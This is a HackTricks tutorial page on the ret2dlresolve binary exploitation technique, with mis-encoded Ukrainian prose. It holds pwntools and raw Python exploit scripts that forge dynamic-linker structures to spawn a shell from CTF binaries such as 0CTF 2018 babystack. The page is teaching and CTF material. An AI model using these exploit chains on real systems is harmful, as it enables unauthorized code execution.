# Ret2dlresolve

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è AWS Red Team Expert (ARTE) –≤—ñ–¥ HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è GCP Red Team Expert (GRTE) –≤—ñ–¥ HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –ø—Ä–æ [**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) —Ç–∞ [**Relro**](../common-binary-protections-and-bypasses/relro.md), –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ –±–µ–∑ Full Relro –±—É–¥—É—Ç—å —Ä–æ–∑—Ä—ñ—à—É–≤–∞—Ç–∏ —Å–∏–º–≤–æ–ª–∏ (—Ç–∞–∫—ñ —è–∫ –∞–¥—Ä–µ—Å–∏ –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫) –ø—Ä–∏ –ø–µ—Ä—à–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ. –¶–µ —Ä–æ–∑—Ä—ñ—à–µ–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó **`_dl_runtime_resolve`**.

–§—É–Ω–∫—Ü—ñ—è **`_dl_runtime_resolve`** –±–µ—Ä–µ –∑—ñ —Å—Ç–µ–∫—É –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –¥–µ—è–∫—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏, —è–∫—ñ —ó–π –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–ª—è **—Ä–æ–∑—Ä—ñ—à–µ–Ω–Ω—è** –≤–∫–∞–∑–∞–Ω–æ–≥–æ —Å–∏–º–≤–æ–ª—É.

–û—Ç–∂–µ, –º–æ–∂–ª–∏–≤–æ **–ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –≤—Å—ñ —Ü—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏**, —â–æ–± –¥–∏–Ω–∞–º—ñ—á–Ω–æ –∑–≤'—è–∑–∞–Ω–∏–π –∫–æ–¥ —Ä–æ–∑—Ä—ñ—à–∏–≤ –∑–∞–ø–∏—Ç–∞–Ω–∏–π —Å–∏–º–≤–æ–ª (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ñ—É–Ω–∫—Ü—ñ—é **`system`**) —ñ –≤–∏–∫–ª–∏–∫–∞–≤ –π–æ–≥–æ –∑ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **`system('/bin/sh')`**).

–ó–∞–∑–≤–∏—á–∞–π –≤—Å—ñ —Ü—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –ø—ñ–¥—Ä–æ–±–ª—è—é—Ç—å—Å—è —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ ROP-–ª–∞–Ω—Ü—é–∂–∫–∞, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î `read`** –Ω–∞ –∑–∞–ø–∏—Å—É–≤–∞–Ω—É –ø–∞–º'—è—Ç—å, –ø—ñ—Å–ª—è —á–æ–≥–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ —Ç–∞ —Ä—è–¥–æ–∫ **`'/bin/sh'** –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è, —â–æ–± –≤–æ–Ω–∏ –±—É–ª–∏ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é read —É –≤—ñ–¥–æ–º–æ–º—É –º—ñ—Å—Ü—ñ, –ø—ñ—Å–ª—è —á–æ–≥–æ ROP-–ª–∞–Ω—Ü—é–∂–æ–∫ –ø—Ä–æ–¥–æ–≤–∂—É—î—Ç—å—Å—è, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ **`_dl_runtime_resolve`**, —â–æ–± –≤—ñ–Ω **—Ä–æ–∑—Ä—ñ—à–∏–≤ –∞–¥—Ä–µ—Å—É `system`** —É –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏—Ö —Å—Ç—Ä—É–∫—Ç—É—Ä–∞—Ö —Ç–∞ **–≤–∏–∫–ª–∏–∫–∞–≤ —Ü—é –∞–¥—Ä–µ—Å—É** –∑ –∞–¥—Ä–µ—Å–æ—é `$'/bin/sh'`.

{% hint style="success" %}
–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –∫–æ—Ä–∏—Å–Ω–∞, –æ—Å–æ–±–ª–∏–≤–æ —è–∫—â–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É (–¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ–∫, —Ç–∞–∫–∏—Ö —è–∫ [**ret2syscall**](rop-syscall-execv/) –∞–±–æ [SROP](srop-sigreturn-oriented-programming/)) —ñ –Ω–µ–º–∞—î —Å–ø–æ—Å–æ–±—ñ–≤ –≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å libc.
{% endhint %}

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü–µ –≤—ñ–¥–µ–æ –¥–ª—è —á—É–¥–æ–≤–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —É –¥—Ä—É–≥—ñ–π –ø–æ–ª–æ–≤–∏–Ω—ñ –≤—ñ–¥–µ–æ:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

–ê–±–æ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –¥–ª—è –∫—Ä–æ–∫ –∑–∞ –∫—Ä–æ–∫–æ–º –ø–æ—è—Å–Ω–µ–Ω–Ω—è:

* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve#how-it-works](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve#how-it-works)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)

## –ü—ñ–¥—Å—É–º–æ–∫ –∞—Ç–∞–∫–∏

1. –ó–∞–ø–∏—à—ñ—Ç—å –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –≤ —è–∫–æ–º—É—Å—å –º—ñ—Å—Ü—ñ
2. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç —Å–∏—Å—Ç–µ–º–∏ (`$rdi = &'/bin/sh'`)
3. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –Ω–∞ —Å—Ç–µ–∫ –∞–¥—Ä–µ—Å–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä –¥–ª—è –≤–∏–∫–ª–∏–∫—É **`_dl_runtime_resolve`**
4. –í–∏–∫–ª–∏—á—Ç–µ **`_dl_runtime_resolve`**
5. **`system`** –±—É–¥–µ —Ä–æ–∑—Ä—ñ—à–µ–Ω–æ —Ç–∞ –≤–∏–∫–ª–∏–∫–∞–Ω–æ –∑ `'/bin/sh'` —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç

–ó [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó pwntools**](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html) –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫ –∞—Ç–∞–∫–∞ **`ret2dlresolve`**:
```python
context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('amd64'))
>>> rop = ROP(elf)
>>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
>>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
>>> rop.ret2dlresolve(dlresolve)
>>> raw_rop = rop.chain()
>>> print(rop.dump())
0x0000:         0x400593 pop rdi; ret
0x0008:              0x0 [arg0] rdi = 0
0x0010:         0x400591 pop rsi; pop r15; ret
0x0018:         0x601e00 [arg1] rsi = 6299136
0x0020:      b'iaaajaaa' <pad r15>
0x0028:         0x4003f0 read
0x0030:         0x400593 pop rdi; ret
0x0038:         0x601e48 [arg0] rdi = 6299208
0x0040:         0x4003e0 [plt_init] system
0x0048:          0x15670 [dlresolve index]
```
## –ü—Ä–∏–∫–ª–∞–¥

### –ß–∏—Å—Ç–∏–π Pwntools

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–ø—Ä–∏–∫–ª–∞–¥ —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —Ç—É—Ç**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **–∑ –¥—É–∂–µ —Ö–æ—Ä–æ—à–∏–º –ø–æ—è—Å–Ω–µ–Ω–Ω—è–º –∫—ñ–Ω—Ü–µ–≤–æ–≥–æ ROP-–ª–∞–Ω—Ü—é–∂–∫–∞**, –∞–ª–µ –æ—Å—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∫—ñ–Ω—Ü–µ–≤–∏–π –µ–∫—Å–ø–ª–æ–π—Ç:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
### –°–∏—Ä–æ–≤–∏–π
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections
bss = 0x804a020

dynstr = 0x804822c

dynsym = 0x80481cc

relplt = 0x80482b0

# Establish two functions

scanInput = p32(0x804843b)
resolve = p32(0x80482f0) #dlresolve address

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = ""

payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in

target.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr

paylaod1 = ""

# Our .rel.plt entry
paylaod1 += p32(elf.got['alarm'])
paylaod1 += p32(r_info)

# Empty
paylaod1 += p32(0x0)

# Our dynsm entry
paylaod1 += p32(dynstr_index)
paylaod1 += p32(0xde)*3

# Our dynstr entry
paylaod1 += "system\x00"

# Store "/bin/sh" here so we can have a pointer ot it
paylaod1 += "/bin/sh\x00"

target.send(paylaod1)

# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt


paylaod2 = ""

paylaod2 += "0"*44
paylaod2 += resolve                 # 0x80482f0
paylaod2 += p32(ret_plt_offset)        # .rel.plt offset
paylaod2 += p32(0xdeadbeef)            # The next return address after 0x80482f0, really doesn't matter for us
paylaod2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

target.send(paylaod2)

# Enjoy the shell!
target.interactive()
```
## –Ü–Ω—à—ñ –ü—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞ –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
* [https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html)
* 32-–±—ñ—Ç–Ω–∞, –±–µ–∑ relro, –±–µ–∑ canary, nx, –±–µ–∑ pie, –±–∞–∑–æ–≤–µ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ —Ç–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è. –î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è bof –¥–ª—è –≤–∏–∫–ª–∏–∫—É `read` —â–µ —Ä–∞–∑ –∑ —Ä–æ–∑–¥—ñ–ª–æ–º `.bss` —Ç–∞ –±—ñ–ª—å—à–∏–º —Ä–æ–∑–º—ñ—Ä–æ–º, —â–æ–± –∑–±–µ—Ä–µ–≥—Ç–∏ —Ç–∞–º —Ñ–∞–ª—å—à–∏–≤—ñ —Ç–∞–±–ª–∏—Ü—ñ `dlresolve` –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è `system`, –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –≥–æ–ª–æ–≤–Ω–æ–≥–æ —Ç–∞ –∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤–µ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –¥–ª—è –≤–∏–∫–ª–∏–∫—É dlresolve —Ç–∞ `system('/bin/sh')`.
